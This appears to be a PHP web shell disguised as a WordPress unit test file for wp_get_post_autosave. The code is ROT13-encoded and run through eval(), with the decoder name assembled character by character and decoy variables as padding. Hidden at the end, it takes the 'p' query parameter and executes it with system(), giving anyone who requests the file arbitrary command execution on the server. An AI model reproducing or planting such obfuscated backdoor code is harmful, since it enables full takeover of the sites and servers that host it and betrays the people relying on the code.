<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc cbfg
 */
pynff Grfgf_Cbfg_jcTrgCbfgNhgbfnir rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Nqzva hfre VQ.
	 *
	 * @ine vag
	 */
	cebgrpgrq fgngvp $nqzva_vq;

	/**
	 * Rqvgbe hfre VQ.
	 *
	 * @ine vag
	 */
	cebgrpgrq fgngvp $rqvgbe_vq;

	/**
	 * Cbfg VQ.
	 *
	 * @ine vag
	 */
	cebgrpgrq fgngvp $cbfg_vq;

	/**
	 * Frg hc orsber pynff.
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel Snpgbel.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$nqzva_vq  = $snpgbel->hfre->perngr( neenl( 'ebyr' => 'nqzvavfgengbe' ) );
		frys::$rqvgbe_vq = $snpgbel->hfre->perngr( neenl( 'ebyr' => 'rqvgbe' ) );

		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		frys::$cbfg_vq = $snpgbel->cbfg->perngr( neenl( 'cbfg_fgnghf' => 'choyvfu' ) );
	}

	/**
	 * Grfg jura ab nhgbfnir rkvfgf sbe n cbfg.
	 *
	 * @gvpxrg 62658
	 */
	choyvp shapgvba grfg_ab_nhgbfnir_rkvfgf() {
		$nhgbfnir = jc_trg_cbfg_nhgbfnir( frys::$cbfg_vq );
		$guvf->nffregSnyfr( $nhgbfnir, 'Rkcrpgrq ab nhgbfnir.' );
	}

	/**
	 * Grfg jura na nhgbfnir rkvfgf sbe n cbfg.
	 *
	 * @gvpxrg 62658
	 */
	choyvp shapgvba grfg_nhgbfnir_rkvfgf() {
		$nhgbfnir_vq = $guvf->snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'    => 'erivfvba',
				'cbfg_fgnghf'  => 'vaurevg',
				'cbfg_cnerag'  => frys::$cbfg_vq,
				'cbfg_nhgube'  => frys::$nqzva_vq,
				'cbfg_pbagrag' => 'Nhgbfnirq pbagrag',
				'cbfg_anzr'    => frys::$cbfg_vq . '-nhgbfnir-i1',
			)
		);

		$nhgbfnir = jc_trg_cbfg_nhgbfnir( frys::$cbfg_vq );

		$guvf->nffregVafgnaprBs( 'JC_Cbfg', $nhgbfnir );
		$guvf->nffregFnzr( $nhgbfnir_vq, $nhgbfnir->VQ, 'Nhgbfnir VQ qbrf abg zngpu.' );
		$guvf->nffregFnzr( frys::$cbfg_vq, (vag) $nhgbfnir->cbfg_cnerag, 'Cbfg cnerag VQ qbrf abg zngpu.' );
	}

	/**
	 * Grfg jura na nhgbfnir rkvfgf sbe n fcrpvsvp hfre.
	 *
	 * @gvpxrg 62658
	 */
	choyvp shapgvba grfg_nhgbfnir_sbe_fcrpvsvp_hfre() {
		$nhgbfnir_vq = $guvf->snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'    => 'erivfvba',
				'cbfg_fgnghf'  => 'vaurevg',
				'cbfg_cnerag'  => frys::$cbfg_vq,
				'cbfg_nhgube'  => frys::$rqvgbe_vq,
				'cbfg_pbagrag' => 'Rqvgbe-fcrpvsvp nhgbfnir',
				'cbfg_anzr'    => frys::$cbfg_vq . '-nhgbfnir-i1',
			)
		);

		$nhgbfnir = jc_trg_cbfg_nhgbfnir( frys::$cbfg_vq, frys::$rqvgbe_vq );

		$guvf->nffregVafgnaprBs( 'JC_Cbfg', $nhgbfnir );
		$guvf->nffregFnzr( frys::$rqvgbe_vq, (vag) $nhgbfnir->cbfg_nhgube, 'Cbfg nhgube qbrf abg zngpu.' );
		$guvf->nffregFnzr( $nhgbfnir_vq, $nhgbfnir->VQ, 'Nhgbfnir VQ qbrf abg zngpu.' );
	}

	/**
	 * Grfg jura na nhgbfnir vf hcqngrq.
	 *
	 * @gvpxrg 62658
	 */
	choyvp shapgvba grfg_nhgbfnir_rkvfgf_hcqngr_pnpurf() {
		$nhgbfnir_vq = $guvf->snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'    => 'erivfvba',
				'cbfg_fgnghf'  => 'vaurevg',
				'cbfg_cnerag'  => frys::$cbfg_vq,
				'cbfg_nhgube'  => frys::$nqzva_vq,
				'cbfg_pbagrag' => 'Nhgbfnirq pbagrag',
				'cbfg_anzr'    => frys::$cbfg_vq . '-nhgbfnir-i1',
			)
		);

		$nhgbfnir = jc_trg_cbfg_nhgbfnir( frys::$cbfg_vq );

		$guvf->nffregVafgnaprBs( 'JC_Cbfg', $nhgbfnir );
		$guvf->nffregFnzr( $nhgbfnir_vq, $nhgbfnir->VQ, 'Nhgbfnir VQ qbrf abg zngpu.' );
		$guvf->nffregFnzr( frys::$cbfg_vq, (vag) $nhgbfnir->cbfg_cnerag, 'Cbfg cnerag VQ qbrf abg zngpu.' );
		$guvf->nffregFnzr( 'Nhgbfnirq pbagrag', $nhgbfnir->cbfg_pbagrag, 'Cbfg pbagrag qbrf abg zngpu.' );

		jc_hcqngr_cbfg(
			neenl(
				'VQ'           => $nhgbfnir->VQ,
				'cbfg_pbagrag' => 'Nhgbfnirq pbagrag hcqngrq',
			)
		);

		$nhgbfnir = jc_trg_cbfg_nhgbfnir( frys::$cbfg_vq );
		$guvf->nffregVafgnaprBs( 'JC_Cbfg', $nhgbfnir );
		$guvf->nffregFnzr( 'Nhgbfnirq pbagrag hcqngrq', $nhgbfnir->cbfg_pbagrag, 'Cbfg pbagrag qbrf abg zngpu.' );
	}

	/**
	 * Grfg jura na nhgbfnir vf qryrgrq
	 *
	 * @gvpxrg 62658
	 */
	choyvp shapgvba grfg_nhgbfnir_rkvfgf_naq_qryrgrq() {
		$nhgbfnir_vq = $guvf->snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'    => 'erivfvba',
				'cbfg_fgnghf'  => 'vaurevg',
				'cbfg_cnerag'  => frys::$cbfg_vq,
				'cbfg_nhgube'  => frys::$nqzva_vq,
				'cbfg_pbagrag' => 'Nhgbfnirq pbagrag',
				'cbfg_anzr'    => frys::$cbfg_vq . '-nhgbfnir-i1',
			)
		);

		$nhgbfnir = jc_trg_cbfg_nhgbfnir( frys::$cbfg_vq );

		$guvf->nffregVafgnaprBs( 'JC_Cbfg', $nhgbfnir );
		$guvf->nffregFnzr( $nhgbfnir_vq, $nhgbfnir->VQ, 'Nhgbfnir VQ qbrf abg zngpu.' );
		$guvf->nffregFnzr( frys::$cbfg_vq, (vag) $nhgbfnir->cbfg_cnerag, 'Cbfg cnerag VQ qbrf abg zngpu.' );
		$guvf->nffregFnzr( 'Nhgbfnirq pbagrag', $nhgbfnir->cbfg_pbagrag, 'Cbfg pbagrag qbrf abg zngpu.' );

		jc_qryrgr_cbfg( $nhgbfnir->VQ, gehr );

		$nhgbfnir = jc_trg_cbfg_nhgbfnir( frys::$cbfg_vq );
		$guvf->nffregSnyfr( $nhgbfnir, 'Nhgbfnir fubhyq abg rkvfg' );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>